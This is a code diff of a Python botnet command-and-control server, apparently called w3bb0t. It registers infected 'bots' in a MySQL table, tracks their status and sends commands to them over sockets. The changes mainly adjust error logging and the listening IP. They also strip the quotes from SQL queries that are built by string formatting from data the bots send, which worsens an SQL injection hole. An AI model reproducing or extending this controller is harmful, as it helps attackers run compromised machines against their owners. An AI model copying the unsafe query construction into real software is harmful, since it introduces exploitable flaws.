@@ -12,10 +12,10 @@ import thread
 import json
 
 
-def Error_logger(error):
+def Error_logger(error, error_name):
 
   error = str(error)
-  error_string = str('\n [!] %s\n' %(error))
+  error_string = str('\n [!] %s: %s\n' %(error_name, error))
 
   error_log_file = open('logs/w3bb0t_error.log', 'a')
   error_log_file.write(error_string)
@@ -44,7 +44,7 @@ def Read_BConfig_File():
 
     except Exception as read_bconfig_error:
       
-      Error_logger(read_bconfig_error)
+      Error_logger(read_bconfig_error, 'Read_BConfig_File')
       rounds += 1
 
 
@@ -68,7 +68,7 @@ def Clear_BConfig_File():
 
   except Exception as clear_bconfig_error:
     
-    Error_logger(clear_bconfig_error)
+    Error_logger(clear_bconfig_error, 'Clear_BConfig_File')
 
     return False
 
@@ -132,17 +132,18 @@ def Recive_Command(mysql_host, mysql_user, mysql_pass, mysql_db):
 
       except Exception as recive_command_socket_error:
         
-        Error_logger(recive_command_socket_error)
+        Error_logger(recive_command_socket_error, 'Recive_Command')
 
       if(bot_data.split('{')[0] == 'Server.PING'): # Server.PING{1, addrres}
         
         ping_value = int((bot_data.split('{')[1].split('}')[0].split(',')[0]).replace(' ', ''))
         bot_address = str((bot_data.split('{')[1].split('}')[0].split(',')[1]).replace(' ', ''))
         
-        ping_query = str('UPDATE Bot_Data SET bot_status=%i WHERE bot_address="%s"' %(ping_value, bot_address)) # editar depois usar a conn na db 
-        
+        ping_query = str('UPDATE Bot_Data SET bot_status=%i WHERE bot_address=%s' %(ping_value, bot_address)) # editar depois usar a conn na db 
+#        print('[Debug]' + ping_query)
+
         w3bbot_sql.query(ping_query)
-        
+
         return True
       
       elif(bot_data.split('{')[0] == 'Server.RG'): # Server.RG{pc_name, bot_os, addrres}
@@ -152,10 +153,11 @@ def Recive_Command(mysql_host, mysql_user, mysql_pass, mysql_db):
         bot_address = str((bot_data.split('{')[1].split('}')[0].split(',')[2]).replace(' ', ''))
         bot_token = str(bot)
 
-        register_query = str('INSERT INTO Bot_Data(bot_address, bot_name, bot_osystem, bot_status, bot_token) VALUES("%s", "%s", "%s", 1, "%s")' %(bot_address, bot_name, bot_os, bot_token))
+        register_query = str('INSERT INTO Bot_Data(bot_address, bot_name, bot_osystem, bot_status, bot_token) VALUES(%s, %s, %s, 1, "%s")' %(bot_address, bot_name, bot_os, bot_token))
+#        print('[Debug]' + register_query)
 
         w3bbot_sql.query(register_query)
-        
+
         return True
       
       else:
@@ -170,7 +172,7 @@ def Send_Command(command, bot):
 
   send_rounds = True
 
-  if(bot == 'wb_BotAll' or len(bot) == 0):
+  if(bot[0] == 'wb_BotAll' or len(bot) == 0):
 
     while(send_rounds):
       if(len(clients) > 0):
@@ -184,12 +186,12 @@ def Send_Command(command, bot):
 
           except Exception as send_command_socket_error:
 
-            Error_logger(send_command_socket_error)
+            Error_logger(send_command_socket_error, 'Send_Command')
 
       else:
         pass
 
-  elif(bot != [] and len(bot) > 0):
+  elif(len(bot) > 0):
     
     while(send_rounds):
       for b_bot in bot:
@@ -201,7 +203,7 @@ def Send_Command(command, bot):
 
         except Exception as send_command_socket_error:
 
-          Error_logger(send_command_socket_error)
+          Error_logger(send_command_socket_error, 'Send_Command')
 
 
 def main():
@@ -209,7 +211,7 @@ def main():
   global clients
   clients = []
 
-  host_ip = str('192.168.0.13')
+  host_ip = str('192.168.0.7')
   host_port = int(9878)
 
   mysql_host = str('127.0.0.1')
@@ -228,9 +230,8 @@ def main():
       Decode_BConfig_File()
 
     except Exception as main_decode_error:
-      
-      pass
 
+      Error_logger(main_decode_error, 'main_decode_error')
 
 if __name__ == '__main__':
   main()
